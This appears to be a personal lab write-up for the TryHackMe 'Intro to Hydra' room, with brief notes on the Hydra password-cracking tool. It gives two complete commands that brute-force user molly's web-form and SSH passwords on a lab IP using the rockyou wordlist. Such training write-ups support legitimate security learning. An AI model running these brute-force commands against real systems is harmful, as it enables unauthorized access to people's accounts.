# Hydra - tryhackme intro to hydra room

## Intro
Hydra is a bruteforce online password cracking program
Uses lists or full bruteforcing
works with many many protocls
https://en.kali.tools/?p=220
https://github.com/vanhauser-thc/thc-hydra
installed by default with kali

### First challenge - brute force molly's web password for flag 1
Command used:
hydra -l molly -P ~/Wordlists/rockyou.txt 10.10.144.111 http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect" -V -f


### Second challenge - brute force molly's ssh password for flag 2
command used:
hydra -l molly -P ~/Wordlists/rockyou.txt 10.10.144.111 -t 8 ssh -V
